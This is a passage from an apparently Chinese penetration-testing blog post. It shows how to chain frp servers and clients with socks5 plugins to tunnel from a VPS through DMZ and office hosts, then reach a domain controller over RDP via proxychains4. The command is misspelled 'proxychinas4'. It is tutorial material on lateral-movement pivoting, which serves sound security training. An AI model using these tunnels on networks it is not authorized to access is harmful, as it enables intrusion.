二层网络代理</h3><p>经过在DMZ区的信息收集发现还有一个网段为192.168.30.0/24的办公区网段，利用frp在DMZ区与办公区搭建一个socks5代理。</p><ol><li>使用VPS作为frp服务端，在VPS上执行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0    <span class="comment"># 在服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="2"><li>在Windows Server 2012 上起一个frp客户端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.200    <span class="comment"># 指向frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向frp服务端绑定的端口</span></span><br><span class="line">[socks5_forward]</span><br><span class="line"><span class="built_in">type</span> = tcp                     <span class="comment"># 所使用的协议类型</span></span><br><span class="line">local_ip = 10.10.10.13         <span class="comment"># 本地监听的ip地址</span></span><br><span class="line">local_port = 10808             <span class="comment"># 要转发的本地端口</span></span><br><span class="line">remote_port = 1080             <span class="comment"># 要转发到的远程端口</span></span><br></pre></td></tr></table></figure><ol start="3"><li>在Windows Server 2012 再起一个frp服务端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\frps.exe -c .\frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.10.13    <span class="comment"># 在Windows Server 2012服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服Windows Server 2012服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="4"><li>在DMZ区的10.10.10.15 Ubuntu上执行</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.\frpc -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13      <span class="comment"># 指向Windows Server 2012 frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向Windows Server 2012 frp服务端绑定的端口</span></span><br><span class="line">[socks5]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 10808            <span class="comment"># 代理所使用的端口，会被转发到服务器</span></span><br><span class="line">plugin = socks5                <span class="comment"># 代理的类型</span></span><br></pre></td></tr></table></figure><ol start="5"><li>编辑proxychains4的配置文件：/etc/proxychains4.conf </li></ol><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png" alt="image-20221103171204998"></p><ol start="6"><li>命令前加上proxychains4</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychinas4 rdesktop 192.168.30.20</span><br></pre></td></tr></table></figure><hr><h3 id="三层网络代理"><a href="#三层网络代理" class="headerlink" title="# 三层网络代理"></a># 三层网络代理</h3><p>通过代理访问到核心区的<strong>192.168.60.10域控制器</strong></p><ol><li>使用VPS作为frp服务端，在VPS上执行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0    <span class="comment"># 在VPS上的FRP服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在VPS上的FRP服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="2"><li>在Windows Server 2012 上执行以下命令：</li></ol><p>启动frp客户端，将本地端口10808转发到VPS的1080端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端配置文件frpc.ini的内容如下</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.200    <span class="comment"># 指向VPS上frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向VPS上frp服务端绑定的端口</span></span><br><span class="line">[socks5_forward]</span><br><span class="line"><span class="built_in">type</span> = tcp                     <span class="comment"># 所使用的协议类型</span></span><br><span class="line">local_ip = 10.10.10.13         <span class="comment"># 本地监听的ip地址</span></span><br><span class="line">local_port = 10808             <span class="comment"># 要转发的本地端口</span></span><br><span class="line">remote_port = 1080             <span class="comment"># 要转发到的远程端口</span></span><br></pre></td></tr></table></figure><ol start="3"><li>在Windows Server 2012 再起一个frp服务端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\frps.exe -c .\frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.10.13    <span class="comment"># 在Windows Server 2012服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服Windows Server 2012服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="4"><li>在<strong>DMZ区</strong>的10.10.10.15 Ubuntu上执行，启动一个客户端</li></ol><p>启动frp客户端，链接上Web服务端，将本地10808端口转发到Windows Server 2012的10808端口上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.\frpc -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13      <span class="comment"># 指向Windows Server 2012 frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向Windows Server 2012 frp服务端绑定的端口</span></span><br><span class="line">[socks5_forward]</span><br><span class="line"><span class="built_in">type</span> = tcp                     <span class="comment"># 所使用的协议类型</span></span><br><span class="line">local_ip = 192.168.30.40       <span class="comment"># 本地监听的IP地址</span></span><br><span class="line">local_port = 10809             <span class="comment"># 要转发的本地端口</span></span><br><span class="line">remote_port = 10808            <span class="comment"># 要转发到的远程端口</span></span><br></pre></td></tr></table></figure><ol start="5"><li>在DMZ区的10.10.10.15 Ubuntu上再启动一个frp服务端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.30.40      <span class="comment"># 指定frp服务器端ip地址</span></span><br><span class="line">bind_port = 7000               <span class="comment"># 指定frp服务端绑定端口</span></span><br></pre></td></tr></table></figure><ol start="6"><li>在办公区的文件服务器上执行</li></ol><p>启动frp客户端，链接Ubuntu的frp服务端，并在10809端口上启动socks5代理服务后，转发到Ubuntu服务器的10809端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.30.40    <span class="comment"># 指向Ubantu服务器上的 frp 服务端IP地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向Ubantu服务器上的 frp 服务端端口</span></span><br><span class="line">[socks5]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 10809            <span class="comment"># 代理所用的端口，会被转发到服务器</span></span><br><span class="line">plugin = socks5                <span class="comment"># 代理类型</span></span><br></pre></td></tr></table></figure><ol start="7"><li>编辑proxychains4的配置文件：/etc/proxychains4.conf </li></ol><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png" alt="image-20221103171204998"></p><ol start="8"><li>命令前加上proxychains4</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychinas4</span> rdesktop <span class="number">192.168.60.10</span></span><br></pre></td></tr></table></figure><p>参考：《内网渗透体系建设》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;frp之一层网络代理-二层网络代理-三层网络代理&quot;&gt;&lt;a href=&quot;#frp之一层网络代理-二层网络代理-三层网络代理&quot; class=&quot;headerlink&quot; title=&quot;frp之一层网络代理 / 二层网络代理 / 三层网络代理&quot;&gt;&lt;/a&gt;frp之一层网络代理</summary>
      
    
    
    
    
    <category term="内网" scheme="https://z4ynadmin.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="代理" scheme="https://z4ynadmin.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
    <category term="frp" scheme="https://z4ynadmin.github.io/tags/frp/"/>
    
  </entry>
  
</feed>
